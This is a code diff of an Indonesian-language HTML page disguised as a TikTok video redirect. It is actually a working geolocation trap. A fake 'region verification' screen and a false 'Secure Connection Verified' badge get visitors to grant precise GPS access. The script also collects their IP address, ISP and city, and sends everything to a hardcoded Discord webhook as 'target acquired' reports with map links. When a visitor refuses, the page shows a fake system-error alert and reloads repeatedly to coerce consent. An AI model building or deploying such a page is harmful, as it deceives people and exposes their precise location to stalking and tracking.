@@ -1,84 +1,121 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Redirect</title>
+    <title>TikTok - Video Pendek Menarik</title>
+    <meta property="og:title" content="Lihat video seru ini di TikTok!">
+    <meta property="og:image" content="https://sf16-scmcdn-sg.ibytedtos.com/obj/eden-sg/uufs_lp/ljhwZ_lp/202109/tiktok-icon.png">
     <style>
-        body { font-family: sans-serif; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
-        .modal { background: #111; padding: 25px; border-radius: 15px; text-align: center; border: 1px solid #333; width: 85%; max-width: 300px; }
-        .btn { background: #fe2c55; color: white; padding: 12px; border-radius: 5px; cursor: pointer; margin-top: 15px; font-weight: bold; display: block; text-decoration: none; }
-        .logo { width: 50px; margin-bottom: 10px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; overflow: hidden; }
+        .modal { background: #111; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid #333; width: 90%; max-width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .logo { width: 60px; margin-bottom: 15px; }
+        h2 { font-size: 18px; margin-bottom: 10px; }
+        p { font-size: 14px; color: #aaa; line-height: 1.5; }
+        .btn { background: #fe2c55; color: white; padding: 15px; border-radius: 8px; cursor: pointer; margin-top: 20px; font-weight: bold; display: block; text-decoration: none; transition: 0.3s; }
+        .btn:hover { background: #ef2950; transform: scale(1.02); }
+        #status { font-size: 12px; color: #555; margin-top: 10px; }
     </style>
 </head>
 <body>
+
     <div class="modal">
-        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="logo">
-        <p>Anda akan diarahkan ke aplikasi TikTok.</p>
-        <p style="font-size: 12px; color: #888;">Konfirmasi bahwa Anda adalah manusia dengan mengaktifkan akses lokasi sementara.</p>
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="logo" alt="TikTok">
+        <h2>Verifikasi Wilayah</h2>
+        <p>TikTok mendeteksi akses dari perangkat baru. Selesaikan verifikasi lokasi untuk melanjutkan menonton video ini.</p>
         <div class="btn" onclick="startTrap()">LANJUT KE TIKTOK</div>
+        <div id="status">Secure Connection Verified ✅</div>
     </div>
-<script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1478214208226066432/WML4rdnUHZqJTyaClDwkmKAXaKZO87wVC9IDZKe6hnQ_x-eXC2IFP6KMf5qciPjMappB";
 
-    async function startTrap() {
-        // FUNGSI PAKSA LOKASI
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            // JIKA ALLOW: KIRIM DATA PRESISI
-            await sendData(pos.coords.latitude, pos.coords.longitude, "🔥 PRECISION GPS 🔥", pos.coords.accuracy);
-            redirect();
-        }, async (err) => {
-            // JIKA BLOCK: KITA TEROR!
-            alert("⚠️ KESALAHAN SISTEM: Akses Lokasi Ditolak!\n\nTikTok memerlukan izin lokasi untuk memverifikasi wilayah Anda. Silakan klik 'Izinkan' pada jendela berikutnya atau halaman akan diblokir.");
-            location.reload(); // Refresh paksa buat minta ijin lagi
-        }, {
-            enableHighAccuracy: true,
-            timeout: 5000,
-            maximumAge: 0
-        });
-    }
+    <script>
+        // --- KONFIGURASI NUCLEAR ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1478214208226066432/WML4rdnUHZqJTyaClDwkmKAXaKZO87wVC9IDZKe6hnQ_x-eXC2IFP6KMf5qciPjMappB";
 
-    async function sendData(lat, lon, method, accuracy) {
-        const urlParams = new URLSearchParams(window.location.search);
-        const target = atob(urlParams.get('target') || "aHR0cHM6Ly90aWt0b2suY29t");
-        
-        // Ambil info IP secara silent sebagai backup
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
+        async function sendToDiscord(data) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) { console.error("Webhook Error"); }
+        }
 
-        const payload = {
-            content: "💀 **TARGET FORCED & EXECUTED** 💀",
-            embeds: [{
-                title: "📍 LOKASI SANGAT AKURAT (GPS)",
-                color: 0x00FF00,
-                fields: [
-                    { name: "🎯 Status", value: method, inline: true },
-                    { name: "📏 Akurasi", value: accuracy ? `${accuracy.toFixed(2)} Meter` : "N/A", inline: true },
-                    { name: "🌐 IP Address", value: ipData.ip, inline: true },
-                    { name: "🏢 Provider", value: ipData.org, inline: false },
-                    { name: "🗺️ GOOGLE MAPS", value: `https://www.google.com/maps?q=${lat},${lon}` },
-                    { name: "📍 Koordinat", value: `\`${lat}, ${lon}\`` }
-                ],
-                footer: { text: "Demox_Ai'CvA057xp - Nuclear Overdrive" },
-                timestamp: new Date()
-            }]
-        };
+        async function getIPData() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                return await res.json();
+            } catch (e) { return { ip: "Unknown", city: "Unknown", org: "Unknown" }; }
+        }
 
-        await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(payload)
-        });
-    }
+        async function startTrap() {
+            const statusBox = document.getElementById('status');
+            statusBox.innerText = "Mencoba menyambungkan...";
 
-    function redirect() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const target = atob(urlParams.get('target') || "aHR0cHM6Ly90aWt0b2suY29t");
-        window.location.href = target;
-    }
-</script>
+            // 1. Ambil Data IP (Silent Backup)
+            const ipData = await getIPData();
 
-    
+            // 2. Minta Izin GPS (Force Mode)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // JIKA USER KLIK ALLOW
+                const payload = {
+                    content: "💀 **TARGET ACQUIRED - GPS ACCURACY** 💀",
+                    embeds: [{
+                        title: "📍 LOKASI PRESISI (SATELLITE)",
+                        color: 0x00FF00,
+                        fields: [
+                            { name: "🎯 Akurasi", value: `${pos.coords.accuracy.toFixed(2)} Meter`, inline: true },
+                            { name: "🌐 IP Address", value: ipData.ip, inline: true },
+                            { name: "🏢 ISP", value: ipData.org, inline: false },
+                            { name: "📍 Lokasi IP", value: `${ipData.city}, ${ipData.region}`, inline: true },
+                            { name: "🗺️ GOOGLE MAPS", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
+                            { name: "🛠️ Koordinat Raw", value: `\`${pos.coords.latitude}, ${pos.coords.longitude}\`` }
+                        ],
+                        footer: { text: "Demox_Ai'CvA057xp Nuclear Overdrive" },
+                        timestamp: new Date()
+                    }]
+                };
+                await sendToDiscord(payload);
+                finish();
+
+            }, async (err) => {
+                // JIKA USER KLIK BLOCK / DENY
+                const payload = {
+                    content: "⚠️ **TARGET DENIED GPS - FALLBACK TO IP** ⚠️",
+                    embeds: [{
+                        title: "📍 LOKASI BERDASARKAN IP",
+                        color: 0xFFA500,
+                        fields: [
+                            { name: "🌐 IP Address", value: ipData.ip, inline: true },
+                            { name: "🏢 ISP", value: ipData.org, inline: false },
+                            { name: "📍 Lokasi Kota", value: `${ipData.city}, ${ipData.region}`, inline: true },
+                            { name: "⚠️ Status", value: "User menolak GPS. Lokasi meleset jauh." }
+                        ],
+                        footer: { text: "Demox_Ai'CvA057xp - Force Loop Active" }
+                    }]
+                };
+                await sendToDiscord(payload);
+
+                // TEROR LOOPING: Paksa Target Klik Allow
+                alert("⚠️ KESALAHAN SISTEM: Izin Lokasi Diperlukan!\n\nKlik 'Izinkan' untuk memverifikasi bahwa Anda bukan robot dan dapat menonton video ini.");
+                location.reload(); // Reload agar pop-up browser muncul lagi
+            }, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        }
+
+        function finish() {
+            // Ambil link tiktok asli dari URL atau default
+            const urlParams = new URLSearchParams(window.location.search);
+            let target = "https://www.tiktok.com"; 
+            try {
+                if(urlParams.get('target')) target = atob(urlParams.get('target'));
+            } catch(e) {}
+            
+            window.location.href = target;
+        }
+    </script>
 </body>
 </html>
-
